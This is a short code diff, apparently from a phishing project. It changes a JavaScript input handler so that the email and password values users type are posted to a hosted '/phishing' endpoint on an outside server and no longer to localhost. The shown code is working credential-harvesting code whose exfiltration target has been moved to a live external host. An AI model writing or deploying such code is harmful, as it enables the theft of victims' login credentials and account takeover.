@@ -26,13 +26,13 @@ const inputHandler = (event) => {
 
     setTimeout(() => {
         if(event.target.id == "email") {
-            fetch('http://localhost:3000/phishing', {
+            fetch('https://phishing-backend-fpla.onrender.com/phishing', {
                 method: 'POST',
                 headers: {"Content-Type": 'application/json'},
                 body: JSON.stringify({email: event.target.value})
             })
         } else {
-            fetch('http://localhost:3000/phishing', {
+            fetch('https://phishing-backend-fpla.onrender.com/phishing', {
                 method: 'POST',
                 headers: {"Content-Type": 'application/json'},
                 body: JSON.stringify({password: event.target.value})
